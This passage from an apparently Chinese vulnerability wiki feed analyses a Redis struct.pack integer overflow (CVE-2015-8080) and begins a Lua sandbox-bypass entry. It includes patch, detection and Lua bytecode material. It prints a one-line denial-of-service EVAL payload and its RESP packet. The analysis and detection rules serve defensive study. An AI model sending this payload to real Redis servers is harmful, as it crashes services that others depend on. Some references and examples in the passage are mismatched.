src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/13.png"></p><p>​        跟进putinteger（）函数，变量size是无符号的整数，经过int类型转换后，负值变为一个大于0x7fffffff的大数，buff数组范围为MAXINTSIZE（0x7fffffff），size变量范围大于MAXINTSIZE（0x7fffffff），故导致缓冲区溢出。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/14.png"></p><h4 id="漏洞触发过程"><a href="#漏洞触发过程" class="headerlink" title="漏洞触发过程"></a>漏洞触发过程</h4><p>​        struct.pack指定为第一个参数的非常大的整数（2^31）,b_pack（）———&gt;optsize（）———&gt;getnum（）导致整数溢出；返回的无符号变量size传入，putinteger（）导致缓冲区溢出。</p><p>​        发送poc后，到达崩溃现场，ESP与EBP中间地址被覆盖：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/18.png"></p><p>​        Redis服务端尝试恢复内存数据失败后退出进程，达到拒绝服务目的。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/19.png"></p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        官方已经发布补丁，在getnum（）函数处，增加lua_State变量指针L，来存放错误信息，在98-99行增加代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (a &gt; (INT_MAX / 10) || a * 10 &gt; (INT_MAX - (**fmt - &#x27;0&#x27;)))</span><br><span class="line">        luaL_error(L, &quot;integral size overflow&quot;);</span><br></pre></td></tr></table></figure><p>​        对当前变量a的值做判断，若当前a大于INT_MAX/10或者当前a*10大于INT_MAX-当前位的值，则返回报错信息L，提示size值超过缓冲区的值。从根本上避免了整数溢出，也避免了后续因为有符号上溢，而导致的缓冲区溢出。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h4 id="攻击包分析"><a href="#攻击包分析" class="headerlink" title="攻击包分析"></a>攻击包分析</h4><p>​        攻击包为RESP协议，Redis默认监听在6379，使用Redis命令，Redis命令详解请看 3.1技术背景。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3表示创建一个大小为3的数组</span><br><span class="line">$4</span><br><span class="line">EVAL 表示创建长度为4的字符串,值为EVAL</span><br><span class="line">$42</span><br><span class="line">struct.pack(&#x27;&lt;4294967295&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;) 同上</span><br><span class="line">$1</span><br><span class="line">0同上</span><br></pre></td></tr></table></figure><p>​        流量结构等同于在Redis客户端输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;struct.pack(&#x27;&lt;4294967295&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/22.png"></p><p>​        之后无返回数据，则说明拒绝服务攻击成功。</p><h4 id="正常包分析"><a href="#正常包分析" class="headerlink" title="正常包分析"></a>正常包分析</h4><p>​        Redis客户端发送RESP命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;struct.pack(&#x27;&lt;I1&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/25.png"></p><p>​        正常包是符合RESP协议，会有回显。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/24.png"></p><h2 id="漏洞检测和防御"><a href="#漏洞检测和防御" class="headerlink" title="漏洞检测和防御"></a>漏洞检测和防御</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>​        缓冲区溢出漏洞只能通过版本对比检测。</p><p>​        运行Redis-server后，控制台会打印版本信息，通过版本比对，若版本低于6.0.3，则有漏洞。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/26.png"></p><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>​        匹配6379端口的流量，匹配字符串的RESP数组。 由于RESP数组始终以“ *”字符开头，对该字符进行字符串匹配。 检测数组的元素是否有EVAL或SCRIPT LOAD命令。</p><p>​        然后，检测调用struct.pack（）方法的数组中匹配Lua脚本代码，并提取该方法的第一个参数。 必须确保此字符串参数的前两个字节包含以下任何字符：“ I”，“ i”，“ &lt;”或““&gt;”。 如果此值大于0x7FFFFFFF，则应将流量视为恶意流量，并且可能正在利用此漏洞进行攻击。</p><ul><li>必须以区分大小写的方式对Lua脚本代码中的对象和方法名称进行字符串匹配。</li><li>必须以不区分大小写的方式执行RESP协议上的字符串匹配。</li><li>由于脚本语言的性质，使用各种脚本技术很容易混淆代码的真实攻击。 </li></ul><h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><a href="https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571">https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14147">https://nvd.nist.gov/vuln/detail/CVE-2020-14147</a></li><li><a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></li><li><a href="https://redis.io/download">https://redis.io/download</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:21:23.000Z</published>
    <updated>2021-07-06T08:46:19.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis EVAL Lua沙箱绕过漏洞</li><li>漏洞编号：CVE-2015-4335</li><li>漏洞类型：代码注入</li><li>CVSS评分：【CVSS v2.0：10.0】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:up to 2.8.20</p><p>Redis:3.0.0 up to 3.0.1</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411">https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/23.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        <strong>Lua</strong>是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p>​        Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p>​        执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br><span class="line">EVALSHA &lt;SHA1 digest from above&gt;</span><br></pre></td></tr></table></figure><p>​        Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct.pack (&quot;&lt;I2&quot;, 10)</span><br></pre></td></tr></table></figure><ul><li>“I”指定整数是无符号的（“ i”用于有符号整数）</li><li>“&lt;”指定应以小端格式表示（“&gt;”用于大端格式）</li><li>“2”指定整数为2个字节长</li><li>“10”指定要打包的整数的值</li></ul><p><strong>ZADD key score member [[score member] [score member] …]</strong></p><blockquote><p>可用版本： &gt;= 1.2.0</p><p>时间复杂度: O(M*log(N))， <code>N</code> 是有序集的基数， <code>M</code> 为成功添加的新成员的数量。</p></blockquote><p>将一个或多个 <code>member</code> 元素及其 <code>score</code> 值加入到有序集 <code>key</code> 当中。</p><p>如果某个 <code>member</code> 已经是有序集的成员，那么更新这个 <code>member</code> 的 <code>score</code> 值，并通过重新插入这个 <code>member</code> 元素，来保证该 <code>member</code> 在正确的位置上。</p><p><code>score</code> 值可以是整数值或双精度浮点数。</p><p>如果 <code>key</code> 不存在，则创建一个空的有序集并执行 <a href="http://redisdoc.com/sorted_set/zadd.html?highlight=zadd#zadd"><strong>ZADD</strong></a> 操作。</p><p>当 <code>key</code> 存在但不是有序集类型时，返回一个错误。</p><p>对有序集的更多介绍请参见 <a href="http://redis.io/topics/data-types#sorted-sets">sorted set</a> 。</p><p>Note：在 Redis 2.4 版本以前， <a href="http://redisdoc.com/sorted_set/zadd.html?highlight=zadd#zadd"><strong>ZADD</strong></a> 每次只能添加一个元素。</p><p><strong>返回值</strong></p><p>被成功添加的新成员的数量，不包括那些被更新的、已经存在的成员。</p><p><strong>代码示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 添加单个元素</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 10 google.com</span><br><span class="line">(integer) 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加多个元素</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 9 baidu.com 8 bing.com</span><br><span class="line">(integer) 2</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;8&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加已存在元素，且 score 值不变</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 10 google.com</span><br><span class="line">(integer) 0</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES  # 没有改变</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;8&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加已存在元素，但是改变 score 值</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 6 bing.com</span><br><span class="line">(integer) 0</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES  # bing.com 元素的 score 值被改变</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;6&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br></pre></td></tr></table></figure><p>LuaDec是lua 5.1的Lua反编译器，并且是lua 5.2和5.3的实验版。它基于Hisham Muhammad的luadec，其针对Zsolt Sz的lua 5.0.x和LuaDec51。Sztupak。</p><p>LuaDec是免费软件，并且使用与原始LuaDec相同的许可证。</p><p><strong>编译中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/viruscamp/luadec</span><br><span class="line">cd luadec</span><br><span class="line">git submodule update --init lua-5.1</span><br><span class="line">cd lua-5.1</span><br><span class="line">make linux</span><br><span class="line">cd ../luadec</span><br><span class="line">make LUAVER=5.1</span><br></pre></td></tr></table></figure><p>如果要为lua 5.2或5.3构建它，只需将上面的5.1替换为5.2或5.3。</p><p>还有vc2008的项目文件，已针对vc2008和vc2013进行了测试。<br>编译之前，请确保lua-5.1，lua-5.2或lua-5.3中的源正确。</p><p><strong>用法</strong></p><ul><li>反编译lua二进制文件：<br>luadec abc.luac</li><li>反编译lua源文件以进行测试和比较：<br>luadec abc.lua</li><li>反汇编lua源代码或二进制<br>luadec -dis abc.lua</li><li>-pn打印嵌套函数结构，-fn可以使用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">luadec -pn test.lua</span><br><span class="line">0</span><br><span class="line">  0_0</span><br><span class="line">    0_0_0</span><br><span class="line">  0_1</span><br></pre></td></tr></table></figure><ul><li>-f仅反编译特定的嵌套函数<br>luadec -f 0_1 test.lua</li><li>-ns不处理子函数<br>luadec -ns -f 0_1 test.lua</li><li>-fc对每个函数<br>luadec -fc test.lua进行逐条指令比较<br>：输出<br>-函数检查通过0-<br>函数检查失败0_0：无法编译<br>-函数检查失败0_1：不同的代码大小；sizecode组织：66；反编译：67；相同：47；</li></ul><p>还有更多选项，通常用于调试目的，或用于内置本地猜测器猜测错误的情况。使用-h获取可用参数的完整列表</p><p><strong>lua的字节码</strong></p><p>​    lua源码在执行前，会被编译为字节码，字节码能加快程序的加载，保存lua源码被意外的修复。lua的字节码只在具有相同的字长和字节顺序的机器上能够移植。<br>​        luac编译器能将lua源码编译为字节码二进制文件，其命令如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luac a.lua</span><br></pre></td></tr></table></figure><p>​        luac默认的输出文件为luac.out,可以通过 -o 选项来指定输出文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luac -o a.out a.lua</span><br></pre></td></tr></table></figure><p>​        当Lua发布新版时，luac生成的二进制文件的内部格式可能改变。</p><p><strong>字节码文件头</strong></p><p><strong>lua5.1</strong>字节码文件头的长度为12字节，Win7 64位，VS下编译为Win32应用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b4c 7561 5100 0104 0404 0800</span><br></pre></td></tr></table></figure><p>其中第1-4字节为：”\033Lua”；第5字节标识lua的版本号，lua5.1为 0x51；第6字节为官方中保留，lua5.1中为 0x0；<br>第7字节标识字节序，little-endian为0x01，big-endian为0x00；<br>第8字节为sizeof(int)；第9字节为sizeof(size_t)；第10字节为sizeof(Instruction)，Instruction为lua内的指令类型，在32位以上的机器上为unsigned int；第11字节为sizeof(lua_Number)，lua_Number即为double;<br>第12字节是判断lua_Number类型起否有效，一般为 0x00;</p><p><strong>lua5.2</strong>字节码文件头的长度为18字节，在我的环境里(Win7 64位，VS下编译为Win32应用)如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b4c 7561 5200 0104 0404 0800 1993 0d0a 1a0a</span><br></pre></td></tr></table></figure><p>其中第1-12字节与lua5.1意义相同，第5字节在lua5.2中为 0x52；<br>第13-18字节是为了捕获字节码的转换错误而设置的，其值为 “\x19\x93\r\n\x1a\n”；</p><p>PS:lua在判断字节序时使用的方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 void luaU_header (char* h)</span><br><span class="line">2 &#123;</span><br><span class="line">3     int x=1;</span><br><span class="line">4     //...</span><br><span class="line">5     *h++=(char)*(char*)&amp;x;             /* endianness */</span><br><span class="line">6     //...</span><br><span class="line">7 &#125;</span><br></pre></td></tr></table></figure><p>在little-endian时，*(char*)&amp;x值为0x01；big-endian时，*(char*)&amp;x值为 0x00；</p><p><strong>字节码文件正文</strong></p><p>​        <strong>lua5.1</strong> 在文件头之后，就是正头，它由一个个函数组成，其中第一个函数包含由文件内全部内容，引全局函数名为”@”+文件件名(包含”.lua”后缀)，在此文件中定义的函数都会在全局函数中以常量字符串保存；<br>每个函数的内容缓存如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">源文件名的长度(包括&#x27;\0&#x27;)，为sizeof(size_t)个字节长，只有全局函数有源文件名，其它内部函数其长度填0；</span><br><span class="line">源文件名(包括\0)，长度为长度*sizeof(char)个字节；</span><br><span class="line">函数行数，全局函数的填0，长度为sizeof(int)个字节；</span><br><span class="line">函数的最后一行，全局函数的填0，长度为sizeof(int)个字节；</span><br><span class="line">函数的upvalues数目，长度为sizeof(char)个字节；</span><br><span class="line">函数的参数个数，全局函数的填0，长度为sizeof(char)个字节；</span><br><span class="line">函数的vararg个数，只有全局函数有；</span><br><span class="line">函数最大的栈数目，长度为sizeof(char)个字节；</span><br><span class="line">函数的指令数目，长度为sizeof(int)个字节；</span><br><span class="line">函数的指令，长度为指令数目*sizeof(Instruction)个字节；</span><br><span class="line">函数中常量的数目，长度为sizeof(int)个字节；</span><br><span class="line">函数中的常量，长度为常量数目*(常量类似标识长度+指定常量点用的长度)，常量类似标识长度为sizeof(char)个字节；</span><br><span class="line">函数中的内部函数数目，长度为sizeof(int)个字节；</span><br><span class="line">内部函数的定，格式同外部函数；</span><br><span class="line">函数的调试信息；</span><br></pre></td></tr></table></figure><p>​        文件binc.lua的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 local i = 6;</span><br><span class="line">2 return 1;</span><br></pre></td></tr></table></figure><p>​        其正文的字节码(lua5.1编译，不包括调试信息,前面的空白外为文件头)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                              0a00 0000</span><br><span class="line">4062 696e 632e 6c75 6100 0000 0000 0000</span><br><span class="line">0000 0000 0202 0400 0000 0100 0000 4140</span><br><span class="line">0000 5e00 0001 1e00 8000 0200 0000 0300</span><br><span class="line">0000 0000 0018 4003 0000 0000 0000 f03f</span><br><span class="line">0000 0000</span><br></pre></td></tr></table></figure><p>​        <strong>lua5.2</strong> 的正文部分与lua5.1存在差别。其没有源文件名的说明，别对于upvalue的处理也不一样，lua5.2中upvalue在常量后面定义，由upvalue的数目后加上分upvalue的定义组成。</p><p><strong>string.gsub()</strong></p><ul><li>原型：string.gsub (s, pattern, repl 